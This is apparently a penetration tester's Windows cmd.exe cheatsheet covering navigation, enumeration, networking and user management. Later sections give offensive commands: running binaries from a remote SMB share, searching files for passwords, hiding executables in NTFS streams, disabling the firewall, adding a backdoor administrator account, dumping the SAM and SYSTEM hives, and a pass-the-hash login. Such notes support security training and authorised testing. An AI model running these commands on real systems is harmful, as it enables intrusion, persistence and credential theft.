# Windows Commands Cheatsheet

These are all for cmd.exe unless stated otherwise. There should be a separate powershell cheatsheet somewhere.

## Essential Navigation
```powershell
# change directory
cd whatever
cd ..
cd "C:\path with spaces\something\"

# print current directory path
echo %cd%

# print file content
type filename.txt
more filename.txt

# directory content
dir
dir /A /R /Q

## show all files (including hidden and system files)
dir /A

## show NTFS streams
dir /R

## metadata (including ownership)
dir /Q

## print recursive directory tree
tree /a /f

## tree-like recursive listing
dir /S

# make directory
mkdir whatever

# remove dir
rm directory

# remove file
del somefile
```

## Copying

```powershell
# copy files
copy C:\somefile C:\somefile_copy

# move file
mv C:\somefileold C:\somefilenew
```

```powershell
# SMB network file transfer
## SMB copy from remote to local machine
copy \\<remote_ip>\<remote_smb_share>\somefile.txt C:\local_somefile.txt
copy \\192.168.0.22\MYSHARE\somefile.txt C:\local_somefile.txt

# SMB copy from local to remote machine
copy C:\local_somefile.txt \\<remote_ip>\<remote_smb_share>\somefile.txt
copy C:\local_somefile.txt \\192.168.0.22\MYSHARE\somefile.txt

### execute binary/script from remote SMB share
\\<remote_ip>\<remote_smb_share>\somefile.bat
\\<remote_ip>\<remote_smb_share>\somefile.exe
```

## Permissions

```powershell
# show permissions for directory
icacls C:\

# change permissions for file/directory
CACLS root.txt /e /p Alfred:f

    R – Read
    W – Write
    C – Change (write)
    F – Full control
```

## Enumeration

```powershell
# whoami
whoami
whoami /priv
whoami /groups
whoami /all

# show system info (CPU architecture etc.)
systeminfo
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% 
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

```powershell
# Manual search passwords in files:
findstr /si password *.xml *.ini *.txt
dir /s *pass* == *.config
```

```powershell
# NTFS Alternative Data Streams
dir /R
more < somefile.txt:hiddenproof.txt
type somebinary.exe > somefile.txt:hiddenbinary.exe
```

### Network

```powershell
# hostname
hostname

# network config
ipconfig
ipconfig /all

# available routes
route print

# known adjacent hosts (arp table)
arp -a
```

```powershell
# print open ports
netstat -ano

# find a port
netstat -an | find "<port>"

# find application by pid
tasklist /fi "pid eq 2216"

# show applications associated with port (requires higher privileges)
netstat -ab | more
```

```powershell
# show firewall config
netsh firewall show config

# disable firewall completely (I hope you know what you are doing)
netsh firewall set opmode disable
NetSh Advfirewall set allprofiles state off
```

### User Management

```powershell
# list users
net user

# create a user
net user <username> <password> /add

# list local groups
net localgroup

# list local administrators
net localgroup administrators

# create a local group
net localgroup <groupname> /add

# add user to a local group
net localgroup <groupname> <username> /add
net localgroup Administrators pentest /add
net localgroup "Remote Desktop Users" pentest /add

# create new admin account summarized
net user cereal hunter7 /add
net localgroup Administrators cereal /add
```

## Post-Exploitation
```powershell
# Dump Secure Account Manager (SAM) database (admin required obviously)
reg save hklm\sam %TEMP%\sam
reg save hklm\system %TEMP%\system

# optional
reg save hklm\security %TEMP%\security
```

```powershell
# show saved creds
cmdkey /list

# runas using saved credentials
runas /savecred /user:admin C:\PrivEsc\reverse.exe

# psexec (sysinternals)
psexec \\<target> -d -u <user> -p <password> <command>

# winexe (from kali)
winexe -U 'admin%password123' //<target_ip> cmd.exe

# pass the hash (from kali)
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:<ntlm_hash>' //<target_ip> cmd.exe
```

